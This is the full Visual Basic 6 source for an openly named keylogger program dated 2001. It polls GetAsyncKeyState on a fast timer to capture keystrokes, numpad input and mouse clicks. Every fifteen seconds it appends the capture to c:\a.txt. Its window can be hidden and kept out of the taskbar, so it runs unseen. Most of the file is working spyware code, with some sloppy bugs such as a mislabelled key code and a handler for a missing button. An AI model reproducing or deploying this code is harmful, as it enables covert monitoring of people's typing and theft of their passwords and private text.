VERSION 5.00
Begin VB.Form KeyLogger 
   BorderStyle     =   0  'None
   Caption         =   "KeyLogger"
   ClientHeight    =   6825
   ClientLeft      =   45
   ClientTop       =   615
   ClientWidth     =   9960
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   6825
   ScaleWidth      =   9960
   ShowInTaskbar   =   0   'False
   StartUpPosition =   2  'CenterScreen
   Begin VB.CommandButton Command3 
      Caption         =   "Exit"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   18
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   855
      Left            =   5160
      TabIndex        =   8
      Top             =   4560
      Width           =   2055
   End
   Begin VB.CommandButton Command2 
      Caption         =   "Hide"
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   18
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   855
      Left            =   2400
      TabIndex        =   7
      Top             =   4560
      Width           =   2055
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Command1"
      Height          =   375
      Left            =   240
      TabIndex        =   6
      Top             =   6960
      Width           =   735
   End
   Begin VB.TextBox Text2 
      Enabled         =   0   'False
      Height          =   2415
      Left            =   4800
      MultiLine       =   -1  'True
      ScrollBars      =   2  'Vertical
      TabIndex        =   3
      Top             =   1680
      Width           =   4695
   End
   Begin VB.Timer Timer5 
      Interval        =   1
      Left            =   1560
      Top             =   4560
   End
   Begin VB.Timer Timer4 
      Interval        =   250
      Left            =   6120
      Top             =   3960
   End
   Begin VB.Timer Timer3 
      Interval        =   1
      Left            =   4440
      Top             =   4320
   End
   Begin VB.Timer Timer2 
      Interval        =   15000
      Left            =   5400
      Top             =   4320
   End
   Begin VB.TextBox Text1 
      Enabled         =   0   'False
      Height          =   2415
      Left            =   360
      MultiLine       =   -1  'True
      TabIndex        =   0
      Top             =   1680
      Width           =   4215
   End
   Begin VB.Timer Timer1 
      Interval        =   1
      Left            =   4920
      Top             =   4320
   End
   Begin VB.Label Label5 
      Height          =   375
      Left            =   480
      TabIndex        =   9
      Top             =   5160
      Width           =   495
   End
   Begin VB.Label Label4 
      Caption         =   "Text already copied:"
      Height          =   255
      Left            =   4920
      TabIndex        =   5
      Top             =   1320
      Width           =   1935
   End
   Begin VB.Label Label3 
      Caption         =   "Text to be copied:"
      Height          =   375
      Left            =   480
      TabIndex        =   4
      Top             =   1320
      Width           =   1455
   End
   Begin VB.Label Label2 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H80000004&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "KeyLogger"
      BeginProperty Font 
         Name            =   "Times New Roman"
         Size            =   27.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   735
      Left            =   2160
      TabIndex        =   2
      Top             =   240
      Width           =   4935
   End
   Begin VB.Label Label1 
      Alignment       =   2  'Center
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BorderStyle     =   1  'Fixed Single
      Caption         =   "Label1"
      ForeColor       =   &H80000008&
      Height          =   255
      Left            =   9000
      TabIndex        =   1
      Top             =   5880
      Width           =   855
   End
   Begin VB.Menu About 
      Caption         =   "About"
      NegotiatePosition=   2  'Middle
   End
End
Attribute VB_Name = "KeyLogger"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Long) As Integer

Private Sub About_Click()
MsgBox ("Made By Jesse Friedman, 2001")
End Sub

Private Sub Command2_Click()
MsgBox "Keystrokes will be saved in c:\a.txt, Press F4 to unHide", vbInformation, "Notice"
KeyLogger.Visible = False
End Sub


Private Sub Command3_Click()
End
End Sub




Private Sub Command5_Click()
Text1.Text = ""
End Sub



Private Sub Timer1_Timer()
For i = 32 To 256
x = GetAsyncKeyState(i)
If x = -32767 Then
Text1.Text = Text1.Text + Chr(i)
End If

'Other Keys(;=,/-.)
x = GetAsyncKeyState(186)
If x = -32767 Then
Text1.Text = Text1.Text + ";"
End If
x = GetAsyncKeyState(187)
If x = -32767 Then
Text1.Text = Text1.Text + "="
End If
x = GetAsyncKeyState(188)
If x = -32767 Then
Text1.Text = Text1.Text + ","
End If
x = GetAsyncKeyState(189)
If x = -32767 Then
Text1.Text = Text1.Text + "-"
End If
x = GetAsyncKeyState(190)
If x = -32767 Then
Text1.Text = Text1.Text + "."
End If
x = GetAsyncKeyState(191)
If x = -32767 Then
Text1.Text = Text1.Text + "/"
End If
'Num Pad
x = GetAsyncKeyState(96)
If x = -32767 Then
Text1.Text = Text1.Text + "0"
End If
x = GetAsyncKeyState(97)
If x = -32767 Then
Text1.Text = Text1.Text + "1"
End If
x = GetAsyncKeyState(98)
If x = -32767 Then
Text1.Text = Text1.Text + "2"
End If
x = GetAsyncKeyState(99)
If x = -32767 Then
Text1.Text = Text1.Text + "3"
End If
x = GetAsyncKeyState(100)
If x = -32767 Then
Text1.Text = Text1.Text + "4"
End If
x = GetAsyncKeyState(101)
If x = -32767 Then
Text1.Text = Text1.Text + "5"
End If
x = GetAsyncKeyState(102)
If x = -32767 Then
Text1.Text = Text1.Text + "6"
End If
x = GetAsyncKeyState(103)
If x = -32767 Then
Text1.Text = Text1.Text + "7"
End If
x = GetAsyncKeyState(104)
If x = -32767 Then
Text1.Text = Text1.Text + "8"
End If
x = GetAsyncKeyState(105)
If x = -32767 Then
Text1.Text = Text1.Text + "9"
End If

x = GetAsyncKeyState(13)
If x = -32767 Then
Text1.Text = Text1.Text + " (Enter) "
End If

'Mouse
x = GetAsyncKeyState(1)
If x = -32767 Then
Text1.Text = Text1.Text + " (LeftMouseClick) "
End If



x = GetAsyncKeyState(118)
If x = -32767 Then
Text1.Text = Text1.Text + " (RightMouseClick) "
End If

x = GetAsyncKeyState(8)
If x = -32767 Then
Text1.Text = Text1.Text + " (BS) "
End If

x = GetAsyncKeyState(115)
If x = -32767 Then
KeyLogger.Visible = True
End If

Next i

End Sub


Private Sub Timer2_Timer()
Open "c:\a.txt" For Append As #1
Write #1, Text1.Text
Close #1
Text2.Text = Text2.Text + Text1.Text
Text1.Text = " "


End Sub

Private Sub Timer3_Timer()
Label1.Caption = Time$
End Sub

Private Sub Timer4_Timer()
Label2.ForeColor = Int(Rnd * QBColor(15))
End Sub

